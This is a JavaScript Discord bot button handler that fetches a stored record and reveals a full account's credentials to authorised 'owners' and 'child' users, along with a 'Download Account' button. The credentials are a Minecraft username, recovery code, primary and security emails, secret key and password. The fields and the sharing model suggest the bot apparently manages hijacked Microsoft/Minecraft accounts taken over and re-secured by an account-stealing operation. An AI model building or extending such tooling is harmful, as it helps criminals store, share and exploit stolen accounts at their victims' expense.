const { queryParams } = require("../../../db/database");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");

const isOwner = require("../../../db/isOwner");

module.exports = {
    name: "copyText",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            let [, copyTextId] = interaction.customId.split("|");
            const results = await client.queryParams("SELECT action FROM actions WHERE id = ?", [copyTextId]);

            if (!results || results.length === 0) {
                return interaction.reply({
                    content: `No action found for ID: ${copyTextId}`,
                    ephemeral: true,
                });
            }

            const parts = results[0].action.split("|");
            let ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password;

            if (parts.length >= 10) {
                [, ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
            } else {
                [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
            }

            const isUserOwner = await isOwner(interaction.user.id);
            const isChildBotOwner = client.username && client.username === interaction.user.id;
            let isAuthorized = isUserOwner || isChildBotOwner || (ownerId && interaction.user.id === ownerId);

            if (!isAuthorized) {
                const targetOwner = ownerId || client.username;
                if (targetOwner) {
                    const childPerm = await queryParams(
                        "SELECT viewaccounts, admin FROM users WHERE user_id = ? AND child = ?",
                        [targetOwner, interaction.user.id]
                    );
                    if (childPerm && childPerm.length > 0 && (childPerm[0].viewaccounts === 1 || childPerm[0].admin === 1)) {
                        isAuthorized = true;
                    }
                }
            }

            if (!isAuthorized) {
                return interaction.reply({
                    content: "You are not authorized to view these credentials.",
                    ephemeral: true,
                });
            }


            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`downloadacc|${copyTextId}`)
                    .setLabel('Download Account')
                    .setStyle(ButtonStyle.Secondary) // The style is now an enum, `ButtonStyle.Secondary`
            );

            return interaction.reply({
                content: `Username: ${newName}\nOwns MC: ${mc}\nCapes: ${capes}\nRecovery Code: ${recoveryCode}\nPrimary Email: ${email}\nSecurity Email: ${secEmail}\nSecret Key: ${secretkey}\nPassword: ${password}`,
                components: [row],
                ephemeral: true,
            });
        } catch (error) {
            console.error("Error processing copy text:", error);
            return interaction.reply({
                content: "An error occurred while retrieving the action details.",
                ephemeral: true,
            });
        }
    },
};
